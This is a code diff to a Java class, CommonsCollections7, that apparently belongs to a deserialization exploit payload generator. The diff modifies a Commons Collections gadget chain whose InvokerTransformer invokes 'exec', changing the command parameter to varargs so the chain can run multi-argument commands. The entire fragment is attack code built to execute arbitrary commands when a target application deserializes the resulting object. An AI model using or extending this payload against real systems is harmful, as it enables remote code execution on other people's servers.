@@ -38,10 +38,10 @@ import java.util.Map;
 
 public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<Hashtable> {
 
-    public Hashtable getObject(final String command) throws Exception {
-
+    public Hashtable getObject(final String ... command) throws Exception {
         // Reusing transformer chain and LazyMap gadgets from previous payloads
-        final String[] execArgs = new String[]{command};
+        final String[] execArgs = command;
+        Class c = execArgs.length > 1 ? String[].class : String.class;
 
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
@@ -54,8 +54,8 @@ public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<
                 new Class[]{Object.class, Object[].class},
                 new Object[]{null, new Object[0]}),
             new InvokerTransformer("exec",
-                new Class[]{String.class},
-                execArgs),
+                new Class[]{c},
+                c == String.class ? execArgs : new Object[] {execArgs}),
             new ConstantTransformer(1)};
 
         Map innerMap1 = new HashMap();
